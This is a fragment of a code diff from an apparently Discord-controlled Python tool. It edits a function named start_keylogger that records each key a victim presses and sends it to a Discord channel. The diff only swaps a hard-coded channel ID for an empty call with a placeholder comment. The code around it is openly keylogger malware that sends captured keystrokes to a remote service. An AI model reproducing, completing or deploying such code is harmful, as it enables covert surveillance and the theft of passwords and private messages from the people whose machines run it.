@@ -613,7 +613,7 @@ async def start_keylogger(ctx):
             key_char = str(key)
         
         # Send the key to the Discord channel
-        channel = bot.get_channel(12565348116028457473)  # Replace YOUR_CHANNEL_ID with your channel's ID
+        channel = bot.get_channel()  # Replace YOUR_CHANNEL_ID with your channel's ID
         if channel:
             asyncio.ensure_future(channel.send(f"Key pressed: {key_char}"))
 
